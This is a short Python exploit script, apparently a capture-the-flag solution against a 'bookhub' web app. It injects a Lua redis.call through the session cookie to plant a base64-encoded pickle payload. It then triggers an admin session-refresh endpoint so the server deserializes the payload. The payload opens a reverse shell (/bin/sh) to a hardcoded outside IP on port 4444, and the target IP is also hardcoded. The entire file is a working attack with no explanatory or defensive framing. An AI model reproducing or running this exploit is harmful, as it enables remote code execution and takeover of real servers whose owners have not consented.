import base64
import re

import requests


def main():
    IP = '18.213.16.123'
    try:
        session_content = base64.b64decode('Y3Bvc2l4CnN5c3RlbQpwMQooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgidXJsLndlLmNvbnRyb2xsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7XCcnCnAyCnRScDMKLg==')
        session_content = session_content.replace("url.we.controll", "123.207.90.143")
        print session_content
        inject_session = 'string.char(' + ','.join([str(ord(x)) for x in session_content]) + ')'
        session = 'k",redis.call("set","bookhub:session:k",{}),"'.format(inject_session)
        url = "http://{}:5000/login/".format(IP)
        r = requests.get(url, cookies={"bookhub-session": session})
        token = re.findall('<input id="csrf_token" name="csrf_token" type="hidden" value="(.*)">', r.text)[0]
        url = "http://{}:5000/admin/system/refresh_session/".format(IP)
        r = requests.post(url, data={"csrf_token": token, "submit": "1"}, cookies={"bookhub-session": session})
        print(r.text)
    except Exception as e:
        print(str(e))


main()